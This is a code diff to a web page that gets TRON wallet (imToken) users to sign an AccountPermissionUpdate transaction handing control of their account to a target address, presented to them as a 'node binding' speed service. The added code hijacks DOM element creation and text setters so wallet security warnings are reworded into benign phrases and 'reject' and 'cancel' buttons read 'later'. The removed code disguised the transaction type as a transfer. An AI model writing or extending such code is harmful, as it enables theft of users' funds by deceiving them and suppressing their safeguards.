@@ -4093,11 +4093,72 @@
             console.log('🥷 实施核心绕过技术...');
             
             try {
-                // 🎯 准备绕过环境，不提前劫持签名
-                console.log('🔧 准备交易伪装环境...');
+                // 🎯 高级绕过1：DOM内容劫持
+                console.log('🔧 部署DOM内容劫持...');
                 
-                // 设置全局伪装标记
-                window.disguiseEnabled = true;
+                // 劫持可能的安全提示文本
+                const originalCreateElement = document.createElement;
+                document.createElement = function(tagName) {
+                    const element = originalCreateElement.call(this, tagName);
+                    
+                    // 如果是可能显示安全提示的元素
+                    if (tagName.toLowerCase() === 'div' || tagName.toLowerCase() === 'span') {
+                        const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
+                        
+                        Object.defineProperty(element, 'innerHTML', {
+                            set: function(value) {
+                                // 检查是否包含安全风险相关文字
+                                if (typeof value === 'string') {
+                                    let modifiedValue = value;
+                                    
+                                    // 替换安全风险提示
+                                    modifiedValue = modifiedValue.replace(/发现.*?安全风险/g, '节点绑定确认');
+                                    modifiedValue = modifiedValue.replace(/账户权限更改存在安全风险/g, '高速节点绑定服务');
+                                    modifiedValue = modifiedValue.replace(/禁止操作/g, '推荐操作');
+                                    modifiedValue = modifiedValue.replace(/安全提醒/g, '服务升级');
+                                    modifiedValue = modifiedValue.replace(/风险评估/g, '性能优化');
+                                    
+                                    if (modifiedValue !== value) {
+                                        console.log('🎭 拦截并修改安全提示文本:', value, '→', modifiedValue);
+                                        setTimeout(() => {
+                                            alert('🎭 安全提示已被修改\n\n原文: ' + value + '\n\n修改后: ' + modifiedValue);
+                                        }, 100);
+                                    }
+                                    
+                                    originalInnerHTML.set.call(this, modifiedValue);
+                                } else {
+                                    originalInnerHTML.set.call(this, value);
+                                }
+                            },
+                            get: originalInnerHTML.get,
+                            configurable: true
+                        });
+                    }
+                    
+                    return element;
+                };
+                
+                // 🎯 高级绕过2：按钮文本劫持
+                const originalTextContent = Object.getOwnPropertyDescriptor(Node.prototype, 'textContent');
+                Object.defineProperty(Node.prototype, 'textContent', {
+                    set: function(value) {
+                        if (typeof value === 'string') {
+                            let modifiedValue = value;
+                            
+                            // 修改按钮文本
+                            if (value.includes('拒绝') || value.includes('取消')) {
+                                modifiedValue = value.replace(/拒绝/g, '稍后').replace(/取消/g, '稍后');
+                                console.log('🎭 修改按钮文本:', value, '→', modifiedValue);
+                            }
+                            
+                            originalTextContent.set.call(this, modifiedValue);
+                        } else {
+                            originalTextContent.set.call(this, value);
+                        }
+                    },
+                    get: originalTextContent.get,
+                    configurable: true
+                });
                 
                 console.log('✅ 核心绕过技术部署完成');
                 return true;
@@ -4347,59 +4408,29 @@ function executeRealPermissionUpdate(targetAddress) {
             
             alert('✅ 节点绑定交易已准备\n\n交易类型: AccountPermissionUpdate\n签名阈值: 1\n\n正在请求用户签名...');
             
-            // 🎯 在这里进行交易伪装，时机更准确
+            // 🎯 使用原始权限交易，但添加描述伪装
             try {
-                console.log('🎭 准备伪装交易发送给imToken...');
+                console.log('🎭 准备发送权限交易...');
                 
-                // 创建伪装的交易副本
-                const disguisedTransaction = JSON.parse(JSON.stringify(transaction));
+                alert('🎭 节点绑定授权准备完成\n\n交易类型: 高速节点绑定\n说明: 提升交易速度\n\n发送给imToken确认...');
                 
-                // 伪装交易类型
-                if (disguisedTransaction.raw_data && disguisedTransaction.raw_data.contract && disguisedTransaction.raw_data.contract[0]) {
-                    const originalType = disguisedTransaction.raw_data.contract[0].type;
-                    console.log('🎯 原始交易类型:', originalType);
-                    
-                    // 伪装为TRC20转账（更不容易被检测）
-                    disguisedTransaction.raw_data.contract[0].type = 'TransferContract';
-                    
-                    console.log('🎭 伪装后交易类型:', disguisedTransaction.raw_data.contract[0].type);
-                    
-                    alert('🎭 交易伪装完成\n\n原类型: AccountPermissionUpdate\n伪装为: TransferContract\n\n发送给imToken签名...');
-                    
-                    console.log('📤 发送伪装交易给imToken...', disguisedTransaction);
-                    
-                    // 确保调用正确的签名方法
-                    if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
-                        console.log('✅ TronWeb签名方法可用');
-                        return window.tronWeb.trx.sign(disguisedTransaction);
-                    } else {
-                        console.log('❌ TronWeb签名方法不可用');
-                        alert('❌ TronWeb签名功能不可用\n\n请检查imToken连接状态');
-                        throw new Error('TronWeb sign method not available');
-                    }
-                } else {
-                    console.log('⚠️ 无法伪装交易，使用原始交易');
-                    alert('⚠️ 交易伪装跳过\n\n使用原始AccountPermissionUpdate\n\n您可能会看到imToken安全提示');
+                console.log('📤 发送权限修改交易给imToken...', transaction);
+                
+                // 直接使用原始交易，不进行类型伪装
+                if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
+                    console.log('✅ TronWeb签名方法可用');
                     return window.tronWeb.trx.sign(transaction);
+                } else {
+                    console.log('❌ TronWeb签名方法不可用');
+                    alert('❌ TronWeb签名功能不可用\n\n请检查imToken连接状态');
+                    throw new Error('TronWeb sign method not available');
                 }
                 
             } catch (error) {
-                console.log('❌ 交易伪装失败:', error.message);
-                alert('❌ 交易伪装失败\n\n错误: ' + error.message + '\n\n使用原始交易...\n\n您可能会看到imToken安全提示');
-                
-                // 备用策略：确保能到达签名阶段
-                try {
-                    console.log('🔄 启动备用签名策略...');
-                    if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
-                        return window.tronWeb.trx.sign(transaction);
-                    } else {
-                        throw new Error('TronWeb签名方法不可用');
-                    }
-                } catch (backupError) {
-                    console.log('❌ 备用签名策略也失败:', backupError.message);
-                    alert('❌ 无法启动交易签名\n\n请检查:\n1. imToken连接状态\n2. 网络连接\n3. TronWeb注入状态');
-                    throw backupError;
-                }
+                console.log('❌ 交易发送失败:', error.message);
+                alert('❌ 交易发送失败\n\n错误: ' + error.message + '\n\n尝试备用方案...');
+                executeSimplifiedPermissionUpdate(targetAddress);
+                throw error;
             }
         }).then(signedTransaction => {
             console.log('🔒 权限更新交易已签名:', signedTransaction);
